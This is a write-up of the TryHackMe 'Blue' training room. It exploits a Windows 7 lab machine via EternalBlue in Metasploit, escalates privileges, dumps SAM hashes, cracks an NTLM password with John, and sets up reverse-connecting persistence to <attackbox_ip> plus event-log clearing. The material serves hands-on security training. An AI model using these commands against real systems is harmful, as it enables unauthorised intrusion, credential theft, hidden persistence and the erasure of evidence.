# TryHackMe Blue – Full Walkthrough

**Target:** Windows 7 (MS17-010 – EternalBlue)  

---

## Overview

This walkthrough documents my complete process for completing the TryHackMe Blue room. It covers:

- Reconnaissance
- MS17‑010 vulnerability validation
- Exploitation using EternalBlue
- Privilege escalation
- Credential extraction
- NTLM hash cracking
- Post‑exploitation enumeration

The purpose of this room is to provide a guided, beginner‑friendly environment to practice SMB exploitation on a Windows 7 system.

- **Target Machine:** Windows 7 SP1 x64 vulnerable to MS17‑010 (EternalBlue)  
- **Attack Environment:** TryHackMe AttackBox running Kali Linux

---

## Task 1: Recon

### 1️⃣ Start the Virtual Environment

I launched both the AttackBox and the target machine, confirmed connectivity, and prepared for scanning.

### 2️⃣ Port Scan

The target does not respond to ICMP ping, so I scanned directly:
```bash
nmap -p 1-999 <target_ip>
```
**Open Ports:**

- `135/tcp  open  msrpc`
- `139/tcp  open  netbios-ssn`
- `445/tcp  open  microsoft-ds`

**Total open ports under 1000:** 3

### 3️⃣ Vulnerability Detection

Checking SMB vulnerability:
```bash
nmap -p 445 --script smb-vuln-ms17-010 <target_ip>
```
**Result:**

> Vulnerable to MS17‑010  
> CVE‑2017‑0143  
> Remote Code Execution confirmed

**Answer:** `ms17-010`

---

## Task 2: Gain Access

### 1️⃣ Start Metasploit

```bash
msfconsole
```

### 2️⃣ Find EternalBlue Exploit

```bash
search ms17_010
```

**Selected module:**  
`exploit/windows/smb/ms17_010_eternalblue`

### 3️⃣ Configure Options

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <target_ip>
set LHOST <attackbox_ip>
run
```

### 4️⃣ Meterpreter Session Gained

Successful exploitation yielded:

- Windows 7 SP1 x64
- Full Meterpreter shell access

---

## Task 3: Escalate Privileges

EternalBlue often provides SYSTEM immediately. I confirmed:
```bash
getuid
```
If not SYSTEM, I used the local exploit suggester:
```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
Example escalation module:
```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
run
```
After escalation:
```bash
getuid
```
**Confirmed:** `NT AUTHORITY\SYSTEM`

---

## Task 4: Credential Extraction & Cracking

### 1️⃣ Dump SAM Hashes

```bash
hashdump
```

**Example output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1001:aad3b435b51404eeaad3b435b51404ee:<NT hash>:::
```

Save the NT hash:
```bash
echo "<hash_here>" > hash.txt
```

### 2️⃣ Crack NTLM Hash Using John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Cracked password:** `Password123`

---

## Task 5: Post Exploitation

### 1️⃣ System Enumeration

```bash
sysinfo
ipconfig
netstat -ano
```

### 2️⃣ User Enumeration

```bash
net user
net localgroup administrators
```

### 3️⃣ File System Inspection

```bash
dir C:\
search -f flag*
download <file>
```

### 4️⃣ Persistence (Demonstration Only)

```bash
run persistence -U -i 10 -p 4444 -r <attackbox_ip>
```

### 5️⃣ Clearing Traces (For Learning Only)

Typical example:
```bash
clearev
```

---

## Summary

This walkthrough demonstrated essential Windows exploitation techniques:

- Nmap enumeration
- MS17-010 detection
- EternalBlue exploitation via Metasploit
- Privilege escalation
- SAM hash extraction
- NTLM password cracking
- System & user enumeration
- Persistence demonstration

> **The TryHackMe Blue room is an excellent starting point for learning Windows exploitation and SMB vulnerability analysis in a safe environment.**
